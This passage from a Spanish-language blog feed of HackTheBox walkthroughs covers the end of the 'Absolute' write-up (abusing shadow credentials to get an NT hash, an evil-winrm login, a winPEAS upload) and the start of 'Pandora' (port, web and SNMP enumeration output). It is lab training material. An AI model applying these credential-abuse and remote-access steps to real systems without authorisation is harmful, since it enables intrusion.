<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating as <span class="s1">'winrm_user'</span> with the certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: winrm_user@absolute.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'winrm_user.ccache'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully restored the old Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'winrm_user'</span>: 8738c7413a5da3bc1d083efc0ab06cb2
</code></pre></div></div>

<h2 id="winrm_user">winrm_user</h2>

<ul>
  <li>Ahora nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>winrm_user.ccache
‚ûú  content evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>esktop&gt; <span class="nb">type </span>user.txt
7db70aea6e4e1e5f4b858e1136fdc263
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>
    <p>Para enumerar el sistema podemos usar winpeas <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a>.</p>
  </li>
  <li>
    <p>La m√°quina en lo persona falla demasiado as√≠ que tuve que hacer lo mismo varias veces hasta para ejecutar el <code class="language-plaintext highlighter-rouge">winPEASx64.exe</code>.</p>
  </li>
  <li>
    <p>Tenia mucho este error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>malloc_consolidate<span class="o">()</span>: unaligned fastbin chunk detected
<span class="o">[</span>1]    109301 IOT instruction  evil-winrm <span class="nt">-i</span> dc.absolute.htb <span class="nt">-r</span> absolute.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Gatogamer_account/Absolute/content/winPEASx64.exe

Info: Uploading /home/miguel/Hackthebox/Absolute/content/winPEASx64.exe to C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments<span class="se">\w</span>inPEASx64.exe

Data: 3183272 bytes of 3183272 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Y bueno tenemos que hacer esta explotaci√≥n <a href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/zi.png" />
</p>

<h2 id="ultima-parte">Ultima parte</h2>

<blockquote>
  <p>Como la m√°quina me esta dando demasiados errores la escalada de privilegios que consiste en hacer un KrbRelay la pueden encuntrar en el post de mi compa√±ero <a href="https://xchg2pwn.github.io/hackthebox/absolute/">https://xchg2pwn.github.io/hackthebox/absolute/</a></p>
</blockquote>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Pandora (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora.html" rel="alternate" type="text/html" title="HackTheBox - Pandora (easy)" /><published>2024-06-19T00:00:00-06:00</published><updated>2024-06-19T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/19/pandora.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6ac0e76002774bbfac92b0dbc86cb6af.png" />
</p>

<ul>
  <li>Pandora is an easy rated Linux machine. The port scan reveals a SSH, web-server and SNMP service running on the box. Initial foothold is obtained by enumerating the SNMP service, which reveals cleartext credentials for user <code class="language-plaintext highlighter-rouge">daniel</code>. Host enumeration reveals Pandora FMS running on an internal port, which can be accessed through port forwarding. Lateral movement to another user called <code class="language-plaintext highlighter-rouge">matt</code> is achieved by chaining SQL injection RCE vulnerabilities in the PandoraFMS service. Privilege escalation to user <code class="language-plaintext highlighter-rouge">root</code> is performed by exploiting a SUID binary for PATH variable injection.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Escaneamos los puertos abiertos por el protocolo TCP y sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.136 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 12:59 CST
Nmap scan report <span class="k">for </span>10.10.11.136
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span class="o">(</span>RSA<span class="o">)</span>
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeraci√≥n">Enumeraci√≥n</h2>

<ul>
  <li>Estas son las tecnolog√≠as que est√°n corriendo en el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">‚ûú</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Apache</span><span class="p">[</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">41</span><span class="p">],</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">contact</span><span class="vi">@panda</span><span class="p">.</span><span class="nf">htb</span><span class="p">,</span><span class="n">example</span><span class="vi">@yourmail</span><span class="p">.</span><span class="nf">com</span><span class="p">,</span><span class="n">support</span><span class="vi">@panda</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">][</span><span class="no">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">41</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.136</span><span class="p">],</span> <span class="no">Open</span><span class="o">-</span><span class="no">Graph</span><span class="o">-</span><span class="no">Protocol</span><span class="p">[</span><span class="n">website</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Play</span> <span class="o">|</span> <span class="no">Landing</span><span class="p">],</span> <span class="n">probably</span> <span class="no">WordPress</span><span class="p">,</span> <span class="no">X</span><span class="o">-</span><span class="no">UA</span><span class="o">-</span><span class="no">Compatible</span><span class="p">[</span><span class="no">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la p√°gina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/pandora/1.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap feroxbuster <span class="nt">-u</span> http://10.10.11.136 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
by Ben <span class="s2">"epi"</span> Risher ü§ì                 ver: 2.10.3
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.10.11.136
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout <span class="o">(</span>secs<span class="o">)</span>        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.10.3
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ <span class="nb">true</span>
 üèÅ  HTTP methods          ‚îÇ <span class="o">[</span>GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press <span class="o">[</span>ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
200      GET       35l      183w    14785c http://10.10.11.136/assets/images/testimonials/author-03.png
200      GET        1l      111w     1965c http://10.10.11.136/assets/images/logo/logo.svg
200      GET        1l      350w    10753c http://10.10.11.136/assets/images/brands/graygrids.svg
200      GET       33l      171w    13994c http://10.10.11.136/assets/images/testimonials/author-01.png
200      GET        1l      230w     6015c http://10.10.11.136/assets/images/footer/brands/lineicons.svg
200      GET       27l      174w    14698c http://10.10.11.136/assets/images/testimonials/author-02.png
200      GET        1l      730w     7340c http://10.10.11.136/assets/images/hero/dotted-shape.svg
200      GET      234l      437w     4182c http://10.10.11.136/assets/css/animate.css
200      GET        1l      609w     8493c http://10.10.11.136/assets/images/footer/shape-2.svg
200      GET        9l       35w      429c http://10.10.11.136/assets/images/footer/shape-1.svg
200      GET        9l       35w      474c http://10.10.11.136/assets/images/footer/shape-3.svg
200      GET       27l       32w    48044c http://10.10.11.136/assets/css/ud-styles.css.map
200      GET        4l       31w      380c http://10.10.11.136/assets/images/404/shape-1.svg
200      GET        4l       31w      384c http://10.10.11.136/assets/images/404/shape-2.svg
200      GET        1l      155w     1625c http://10.10.11.136/assets/images/404/dotted-shape.svg
200      GET        1l       31w      622c http://10.10.11.136/assets/images/faq/shape.svg
200      GET        1l      111w     1968c http://10.10.11.136/assets/images/logo/logo-2.svg
200      GET        7l     1994w   162720c http://10.10.11.136/assets/css/bootstrap.min.css
301      GET        9l       28w      313c http://10.10.11.136/assets <span class="o">=&gt;</span> http://10.10.11.136/assets/
200      GET        3l      148w     8157c http://10.10.11.136/assets/js/wow.min.js
200      GET       78l      139w     1147c http://10.10.11.136/assets/scss/_about.scss
200      GET       93l      254w     2626c http://10.10.11.136/assets/js/main.js
200      GET      502l      801w     7736c http://10.10.11.136/assets/scss/_blog-details.scss
200      GET      122l      211w     2138c http://10.10.11.136/assets/scss/_pricing.scss
200      GET       29l       56w      536c http://10.10.11.136/assets/scss/ud-styles.scss
200      GET      132l      223w     2004c http://10.10.11.136/assets/scss/_contact.scss
200      GET       31l       82w      459c http://10.10.11.136/assets/scss/_default.scss
200      GET      155l      241w     2354c http://10.10.11.136/assets/scss/_footer.scss
200      GET       99l      175w     1471c http://10.10.11.136/assets/scss/_404.scss
200      GET      297l      529w     5316c http://10.10.11.136/assets/scss/_header.scss
200      GET      179l      282w     2711c http://10.10.11.136/assets/scss/_common.scss
200      GET      106l      166w     1676c http://10.10.11.136/assets/scss/_testimonials.scss
200      GET      138l      221w     2016c http://10.10.11.136/assets/scss/_hero.scss
200      GET      110l      178w     1858c http://10.10.11.136/assets/scss/_features.scss
200      GET       81l      131w     1226c http://10.10.11.136/assets/scss/_team.scss
200      GET       97l      150w     1467c http://10.10.11.136/assets/scss/_blog.scss
200      GET       73l      122w     1416c http://10.10.11.136/assets/scss/_mixin.scss
200      GET      110l      174w     1783c http://10.10.11.136/assets/scss/_login.scss
200      GET        7l     1019w    78468c http://10.10.11.136/assets/js/bootstrap.bundle.min.js
200      GET      254l     1427w   113210c http://10.10.11.136/assets/fonts/LineIcons.woff2
200      GET     2001l     7262w   150863c http://10.10.11.136/assets/fonts/LineIcons.ttf
200      GET      327l     1717w   138665c http://10.10.11.136/assets/fonts/LineIcons.woff
200      GET     2001l     7264w   151045c http://10.10.11.136/assets/fonts/LineIcons.eot
200      GET        1l      339w     6616c http://10.10.11.136/assets/images/brands/uideck.svg
200      GET        1l      224w    10862c http://10.10.11.136/assets/images/footer/brands/graygrids.svg
200      GET        1l       77w     1328c http://10.10.11.136/assets/images/favicon.svg
200      GET        1l      467w    11946c http://10.10.11.136/assets/images/brands/ecommerce-html.svg
200      GET        1l       87w     1454c http://10.10.11.136/assets/images/brands/ayroui.svg
200      GET        1l      339w     6613c http://10.10.11.136/assets/images/footer/brands/uideck.svg
200      GET        1l      296w     5850c http://10.10.11.136/assets/images/brands/lineicons.svg
200      GET        1l      343w    12105c http://10.10.11.136/assets/images/footer/brands/ecommerce-html.svg
200      GET     2613l     5243w    49342c http://10.10.11.136/assets/css/ud-styles.css
200      GET        1l      447w     7311c http://10.10.11.136/assets/images/hero/brand.svg
200      GET        1l      436w     8716c http://10.10.11.136/assets/images/brands/tailwindtemplates.svg
200      GET        1l       87w     1451c http://10.10.11.136/assets/images/footer/brands/ayroui.svg
200      GET      907l     2081w    33560c http://10.10.11.136/index.html
200      GET        1l       23w   205311c http://10.10.11.136/assets/images/hero/hero-image.svg
200      GET     2210l     2818w    26978c http://10.10.11.136/assets/css/lineicons.css
200      GET        0l        0w   263054c http://10.10.11.136/assets/images/about/about-image.svg
200      GET      907l     2081w    33560c http://10.10.11.136/
200      GET        1l       14w      206c http://10.10.11.136/assets/images/team/shape-2.svg
200      GET        1l      514w     5303c http://10.10.11.136/assets/images/team/dotted-shape.svg
200      GET        1l       63w      965c http://10.10.11.136/assets/images/blog/quote-bg.svg
200      GET        1l       59w      931c http://10.10.11.136/assets/images/banner/banner-bg.svg
200      GET       72l      384w    26960c http://10.10.11.136/assets/images/blog/article-author-01.png
200      GET       22l       41w      444c http://10.10.11.136/assets/scss/_banner.scss
200      GET       20l      133w    10610c http://10.10.11.136/assets/images/blog/author-01.png
200      GET        1l      155w     1622c http://10.10.11.136/assets/images/blog/dotted-shape.svg
200      GET       80l      414w    26651c http://10.10.11.136/assets/images/blog/article-author-04.png
200      GET       58l      396w    24661c http://10.10.11.136/assets/images/blog/article-author-03.png
200      GET       64l      372w    28012c http://10.10.11.136/assets/images/blog/article-author-02.png
200      GET      225l     1315w   108072c http://10.10.11.136/assets/images/team/team-01.png
200      GET      290l     1846w   119742c http://10.10.11.136/assets/images/blog/bannder-ad.png
200      GET        8l       57w      455c http://10.10.11.136/assets/scss/_variables.scss
200      GET      228l     1302w   102185c http://10.10.11.136/assets/images/team/team-02.png
200      GET      177l     1156w    99288c http://10.10.11.136/assets/images/team/team-03.png
200      GET      319l     1954w   151043c http://10.10.11.136/assets/images/blog/blog-03.jpg
200      GET       81l      155w     1431c http://10.10.11.136/assets/scss/_faq.scss
200      GET      230l     1276w   100315c http://10.10.11.136/assets/images/team/team-04.png
200      GET      379l     2166w   162485c http://10.10.11.136/assets/images/blog/blog-01.jpg
200      GET      592l     3151w   242515c http://10.10.11.136/assets/images/blog/blog-02.jpg
200      GET     1616l    75767w   593511c http://10.10.11.136/assets/fonts/LineIcons.svg
200      GET     6061l    33168w  2270905c http://10.10.11.136/assets/images/blog/blog-details-01.jpg
</code></pre></div></div>

<ul>
  <li>Bueno nada interesante ahora vamos a buscar subdominios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap gobuster vhost <span class="nt">-u</span> http://10.10.11.136 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">--no-error</span> <span class="nt">-t</span> 80
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:             http://10.10.11.136
<span class="o">[</span>+] Method:          GET
<span class="o">[</span>+] Threads:         80
<span class="o">[</span>+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
<span class="o">[</span>+] User Agent:      gobuster/3.6
<span class="o">[</span>+] Timeout:         10s
<span class="o">[</span>+] Append Domain:   <span class="nb">false</span>
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>VHOST enumeration mode
<span class="o">===============================================================</span>
Progress: 114441 / 114442 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Pues bueno no encontramos nada algo que podemos hacer es escanear los puertos abiertos pero por el protocolo UDP.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-sU</span> <span class="nt">--top-ports</span> 100 <span class="nt">-T5</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">--open</span> 10.10.11.136 <span class="nt">-oG</span> udpPorts
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 13:19 CST
Initiating Ping Scan at 13:19
Scanning 10.10.11.136 <span class="o">[</span>4 ports]
Completed Ping Scan at 13:19, 0.13s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating UDP Scan at 13:19
Scanning 10.10.11.136 <span class="o">[</span>100 ports]
Warning: 10.10.11.136 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
Discovered open port 161/udp on 10.10.11.136
</code></pre></div></div>

<ul>
  <li>Solo tenemos 1 puerto abierto el cual corre el servicio <code class="language-plaintext highlighter-rouge">snmp</code> vamos a escanearlo para ver mas informaci√≥n sobre ese puerto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap <span class="nb">sudo </span>nmap <span class="nt">-sUCV</span> <span class="nt">-p161</span> 10.10.11.136 <span class="nt">-oN</span> UDPtargeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-19 13:21 CST
Nmap scan report <span class="k">for </span>10.10.11.136
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>snmp-win32-software: no string output.
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
| snmp-interfaces:
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 365.41 Kb sent, 365.41 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b0:de:f7 <span class="o">(</span>VMware<span class="o">)</span>
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 756.20 Mb sent, 99.77 Mb received
| snmp-sysdescr: Linux pandora 5.4.0-91-generic <span class="c">#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64</span>
|_  System <span class="nb">uptime</span>: 27m5.89s <span class="o">(</span>162589 timeticks<span class="o">)</span>
| snmp-processes:
|   1:
|     Name: systemd
|   2:
|     Name: kthreadd
|   3:
|     Name: rcu_gp
|   4:
|     Name: rcu_par_gp
|   5:
|     Name: kworker/0:0-mm_percpu_wq
|   6:
|     Name: kworker/0:0H-kblockd
|   9:
|     Name: mm_percpu_wq
|   10:
|     Name: ksoftirqd/0
|   11:
|     Name: rcu_sched
|   12:
|     Name: migration/0
|   13:
|     Name: idle_inject/0
|   14:
|     Name: cpuhp/0
|   15:
|     Name: cpuhp/1
|   16:
|     Name: idle_inject/1
|   17:
|     Name: migration/1
|   18:
|     Name: ksoftirqd/1
|   20:
|     Name: kworker/1:0H-kblockd
|   21:
|     Name: kdevtmpfs
|   22:
|     Name: netns
|   23:
|     Name: rcu_tasks_kthre
|   24:
|     Name: kauditd
|   25:
|     Name: khungtaskd
|   26:
|     Name: oom_reaper
|   27:
|     Name: writeback
|   28:
|     Name: kcompactd0
|   29:
|     Name: ksmd
|   30:
|     Name: khugepaged
|   77:
|     Name: kintegrityd
|   78:
|     Name: kblockd
|   79:
|     Name: blkcg_punt_bio
|   80:
|     Name: tpm_dev_wq
|   81:
|     Name: ata_sff
|   82:
|     Name: md
|   83:
|     Name: edac-poller
|   84:
|     Name: devfreq_wq
|   85:
|     Name: watchdogd
|   88:
|     Name: kswapd0
|   89:
|     Name: ecryptfs-kthrea
|   91:
|     Name: kthrotld
|   92:
|     Name: irq/24-pciehp
|   93:
|     Name: irq/25-pciehp
|   94:
|     Name: irq/26-pciehp
|   95:
|     Name: irq/27-pciehp
|   96:
|     Name: irq/28-pciehp
|   97:
|     Name: irq/29-pciehp
|   98:
|     Name: irq/30-pciehp
|   99:
|     Name: irq/31-pciehp
|   100:
|     Name: irq/32-pciehp
|   101:
|     Name: irq/33-pciehp
|   102:
|     Name: irq/34-pciehp
|   103:
|     Name: irq/35-pciehp
|   104:
|     Name: irq/36-pciehp
|   105:
|     Name: irq/37-pciehp
|   106:
|     Name: irq/38-pciehp
|   107:
|     Name: irq/39-pciehp
|   108:
|     Name: irq/40-pciehp
|   109:
|     Name: irq/41-pciehp
|   110:
|     Name: irq/42-pciehp
|   111:
|     Name: irq/43-pciehp
|   112:
|     Name: irq/44-pciehp
|   113:
|     Name: irq/45-pciehp
|   114:
|     Name: irq/46-pciehp
|   115:
|     Name: irq/47-pciehp
|   116:
|     Name: irq/48-pciehp
|   117:
|     Name: irq/49-pciehp
|   118:
|     Name: irq/50-pciehp
|   119:
|     Name: irq/51-pciehp
|   120:
|     Name: irq/52-pciehp
|   121:
|     Name: irq/53-pciehp
|   122:
|     Name: irq/54-pciehp
|   123:
|     Name: irq/55-pciehp
|   124:
|     Name: acpi_thermal_pm
|   125:
|     Name: scsi_eh_0
|   126:
|     Name: scsi_tmf_0
|   127:
|     Name: scsi_eh_1
|   128:
|     Name: scsi_tmf_1
|   130:
|     Name: vfio-irqfd-clea
|   131:
|     Name: ipv6_addrconf
|   141:
|     Name: kstrp
|   144:
|     Name: kworker/u5:0
|   157:
|     Name: charger_manager
|   202:
|     Name: scsi_eh_2
|   203:
|     Name: scsi_tmf_2
|   204:
|     Name: scsi_eh_3
|   205:
|     Name: scsi_tmf_3
|   206:
|     Name: mpt_poll_0
|   207:
|     Name: cryptd
|   215:
|     Name: scsi_eh_4
|   217:
|     Name: scsi_tmf_4
|   218:
|     Name: mpt/0
|   220:
|     Name: scsi_eh_5
|   224:
|     Name: scsi_tmf_5
|   225:
|     Name: scsi_eh_6
|   226:
|     Name: scsi_tmf_6
|   227:
|     Name: scsi_eh_7
|   228:
|     Name: scsi_tmf_7
|   232:
|     Name: scsi_eh_8
|   237:
|     Name: scsi_tmf_8
|   239:
|     Name: scsi_eh_9
|   240:
|     Name: scsi_tmf_9
|   241:
|     Name: scsi_eh_10
|   254:
|     Name: scsi_tmf_10
|   255:
|     Name: scsi_eh_11
|   256:
|     Name: scsi_tmf_11
|   257:
|     Name: scsi_eh_12
|   259:
|     Name: kworker/1:3-events
|   260:
|     Name: scsi_tmf_12
|   261:
|     Name: scsi_eh_13
|   262:
|     Name: irq/16-vmwgfx
|   263:
|     Name: scsi_tmf_13
|   264:
|     Name: ttm_swap
|   265:
|     Name: scsi_eh_14
|   266:
|     Name: scsi_tmf_14
|   267:
|     Name: scsi_eh_15
|   268:
|     Name: scsi_tmf_15
|   269:
|     Name: scsi_eh_16
|   270:
|     Name: scsi_tmf_16
|   271:
|     Name: scsi_eh_17
|   272:
|     Name: scsi_tmf_17
|   273:
|     Name: scsi_eh_18
|   274:
|     Name: scsi_tmf_18
|   275:
|     Name: scsi_eh_19
|   276:
|     Name: scsi_tmf_19
|   277:
|     Name: scsi_eh_20
|   278:
|     Name: scsi_tmf_20
|   279:
|     Name: scsi_eh_21
|   280:
|     Name: scsi_tmf_21
|   281:
|     Name: scsi_eh_22
|   282:
|     Name: scsi_tmf_22
|   283:
|     Name: scsi_eh_23
|   284:
|     Name: scsi_tmf_23
|   285:
|     Name: scsi_eh_24
|   286:
|     Name: scsi_tmf_24
|   287:
|     Name: scsi_eh_25
|   288:
|     Name: scsi_tmf_25
|   289:
|     Name: scsi_eh_26
|   290:
|     Name: scsi_tmf_26
|   291:
|     Name: scsi_eh_27
|   292:
|     Name: scsi_tmf_27
|   293:
|     Name: scsi_eh_28
|   294:
|     Name: scsi_tmf_28
|   295:
|     Name: scsi_eh_29
|   296:
|     Name: scsi_tmf_29
|   297:
|     Name: scsi_eh_30
|   298:
|     Name: scsi_tmf_30
|   299:
|     Name: scsi_eh_31
|   300:
|     Name: scsi_tmf_31
|   324:
|     Name: kworker/u4:27-events_power_efficient
|   329:
|     Name: scsi_eh_32
|   330:
|     Name: scsi_tmf_32
|   331:
|     Name: kworker/1:1H-kblockd
